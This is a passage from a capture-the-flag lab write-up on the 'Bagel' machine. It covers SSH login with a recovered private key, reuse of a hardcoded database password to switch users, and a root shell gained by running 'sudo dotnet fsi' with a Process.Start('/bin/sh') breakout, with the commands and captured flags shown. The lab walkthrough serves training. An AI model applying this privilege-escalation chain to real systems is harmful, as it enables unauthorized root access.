  },
  "WriteOrder": null,
  "ReadOrder": null
}
< b''
```

Saving the above to `phil_id_rsa` and SSHing in with this key, we obtain the user flag:

```bash
$ssh -i phil_id_rsa phil@bagel.htb
Last login: Sun Apr  9 02:52:00 2023 from 10.10.14.40
[phil@bagel ~]$ ls -la
total 888
drwx------. 5 phil phil   4096 Apr  9 02:30 .
drwxr-xr-x. 4 root root     35 Aug  9  2022 ..
lrwxrwxrwx. 1 root root      9 Jan 20 17:59 .bash_history -> /dev/null
-rw-r--r--. 1 phil phil     18 Jan 20  2022 .bash_logout
-rw-r--r--. 1 phil phil    141 Jan 20  2022 .bash_profile
-rw-r--r--. 1 phil phil    492 Jan 20  2022 .bashrc
drwxrwxr-x. 3 phil phil   4096 Oct 22 21:16 .dotnet
drwx------. 3 phil phil     69 Apr  9 01:50 .gnupg
-rw-------. 1 phil phil     20 Apr  9 02:24 .lesshst
-rw-r--r--. 1 phil phil  46631 Feb 19 10:57 LinEnum.sh
-rw-r--r--. 1 phil phil 828145 Feb 19 06:30 linpeas.sh
drwx------. 2 phil phil     61 Oct 23 18:59 .ssh
-rw-r-----. 1 root phil     33 Apr  7 07:21 user.txt
[phil@bagel ~]$ cat user.txt
8b326b2de15faecfcfa7968d8a56ab71
```

## Privilege Escalation

Unfortunately, I don't have phil's password, so can't see available sudoer commands with `sudo -l`:

```bash
[phil@bagel ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for phil: 
```

Running `pspy` to see which processes/events are running on the system -- this may or may not be something?:

```
2023/04/09 10:14:50 CMD: UID=1001 PID=80564  | /usr/bin/sh /usr/libexec/grepconf.sh -c 
2023/04/09 10:14:50 CMD: UID=1001 PID=80565  | grep -qsi ^COLOR.*none /etc/GREP_COLORS 
2023/04/09 10:14:50 CMD: UID=1001 PID=80566  | -bash 
2023/04/09 10:14:50 CMD: UID=1001 PID=80569  | /usr/bin/sh /usr/libexec/grepconf.sh -c 
2023/04/09 10:14:50 CMD: UID=1001 PID=80570  | grep -qsi ^COLOR.*none /etc/GREP_COLORS 
2023/04/09 10:14:50 CMD: UID=1001 PID=80571  | /usr/bin/sh /usr/libexec/grepconf.sh -c 
2023/04/09 10:14:50 CMD: UID=1001 PID=80572  | grep -qsi ^COLOR.*none /etc/GREP_COLORS 
2023/04/09 10:14:50 CMD: UID=1001 PID=80577  | /usr/bin/locale 
2023/04/09 10:14:50 CMD: UID=1001 PID=80576  | -bash 
2023/04/09 10:14:50 CMD: UID=1001 PID=80578  | /usr/bin/sed -r -e s/^[[:blank:]]*([[:upper:]_]+)=([[:print:][:digit:]\._-]+|"[[:print:][:digit:]\._-]+")/export \1=\2/;t;d /etc/locale.conf 
```

Remembering the database connection string we found hardcoded before, with `User ID=dev;Password=k8wdAYYKyhnjg3K` -- I tried `su - developer`:

```bash
[developer@bagel ~]$ [phil@bagel ~]$ su - developer
Password: 
[developer@bagel ~]$ 
[developer@bagel ~]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME
    LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

We have privelege escalated to the `developer` user and `sudo -l` shows we can run `/usr/bin/dotnet` as root.  Looking at [GTFOBins](https://gtfobins.github.io/gtfobins/dotnet/) for dotnet, we can run `dotnet fsi` to get an F# interactive shell, and then break out to a shell with `System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;`.  Trying this out:

```bash
[developer@bagel ~]$ sudo /usr/bin/dotnet fsi

Microsoft (R) F# Interactive version 12.0.0.0 for F# 6.0
Copyright (c) Microsoft Corporation. All Rights Reserved.

For help type #help;;

> System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
sh-5.2# whoami
root
sh-5.2# ls -la /root
total 60
dr-xr-x---.  7 root root  4096 Feb 14 11:53 .
drwxr-xr-x. 18 root root  4096 Jan 20 18:00 ..
-rw-------.  1 root root  1105 Oct 22 20:47 anaconda-ks.cfg
-rwxr-xr-x.  1 root root 16200 Oct 23 19:41 bagel
lrwxrwxrwx.  1 root root     9 Jan 20 17:59 .bash_history -> /dev/null
-rw-r--r--.  1 root root    18 Jan 21  2022 .bash_logout
-rw-r--r--.  1 root root   141 Jan 21  2022 .bash_profile
-rw-r--r--.  1 root root   429 Jan 21  2022 .bashrc
-rw-r--r--.  1 root root   100 Jan 21  2022 .cshrc
drwxr-xr-x.  4 root root  4096 Apr  8 20:50 .dotnet
drwxr-xr-x.  3 root root    19 Oct 22 21:12 .local
drwxr-xr-x.  4 root root    35 Oct 22 21:12 .nuget
-rw-r-----.  1 root root    33 Apr  7 07:21 root.txt
drwx------.  2 root root    25 Jan 26 19:44 .ssh
-rw-r--r--.  1 root root   129 Jan 21  2022 .tcshrc
drwxr-xr-x.  4 root root    39 Oct 22 21:12 .templateengine
-rw-------.  1 root root   532 Feb 14 11:53 .viminfo
sh-5.2# cat /root/root.txt
095531d4ca9a340c67f09d86bd6f5d25
```

Easy -- we have the root flag!

## Conclusion

Using the proc filesystem to further enumerate the machine via LFI was a cool little trick that took a little while for me to discover.  I enjoyed the curveball of expecting to attack a Python app, but surprisingly shifting focus to attacking .NET running on Linux -- something I have not previously had experience with.  Thankfully after gaining a foothold, privilege escalation to root was a relatively easy and obvious path.  Overall, this was something a little different and interesting.
